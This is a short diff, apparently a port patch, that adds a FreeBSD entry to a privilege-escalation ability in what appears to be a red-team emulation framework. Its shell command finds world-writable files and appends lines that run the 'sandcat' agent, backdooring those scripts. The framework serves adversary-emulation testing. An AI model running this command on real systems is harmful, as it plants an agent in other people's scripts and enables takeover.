@@ -1,0 +1,12 @@
+--- plugins/stockpile/data/abilities/privilege-escalation/10681f2f-be03-44af-858d-f2b0812df185.yml.orig	2022-09-14 02:24:22 UTC
++++ plugins/stockpile/data/abilities/privilege-escalation/10681f2f-be03-44af-858d-f2b0812df185.yml
+@@ -18,3 +18,9 @@
+           find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\n" "chmod +x sandcat.go-linux && sandcat.go-linux" >> "{}"; ls "{}" ' \; | echo "complete"
+         payloads:
+         - sandcat.go
++    freebsd:
++      sh:
++        command: |
++          find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\n" "chmod +x sandcat.go-freebsd && sandcat.go-freebsd" >> "{}"; ls "{}" ' \; | echo "complete"
++        payloads:
++        - sandcat.go         
